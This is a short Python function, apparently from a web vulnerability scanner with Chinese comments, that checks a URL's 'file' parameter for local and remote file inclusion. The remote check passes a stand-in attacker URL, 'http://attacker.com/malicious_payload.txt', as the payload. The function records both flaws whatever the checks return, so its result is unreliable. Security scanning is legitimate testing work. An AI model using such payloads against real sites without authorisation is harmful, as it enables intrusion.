from file_inclusion.fi_loacal import detect_file_inclusion
from file_inclusion.fi_remote import scan_remote_file_inclusion

def check_file_inclusion(url):
    vulnerabilities_found = []

    # 检测文件包含漏洞
    detect_file_inclusion(url, file_param="file")
    vulnerabilities_found.append("文件包含漏洞")

    # 检测远程文件包含漏洞
    scan_remote_file_inclusion(url, file_param="file", file_path="http://attacker.com/malicious_payload.txt")
    vulnerabilities_found.append("远程文件包含漏洞")

    if vulnerabilities_found:
        return vulnerabilities_found[-1]  # 只返回最新检测出的漏洞，最多一个
    else:
        return None
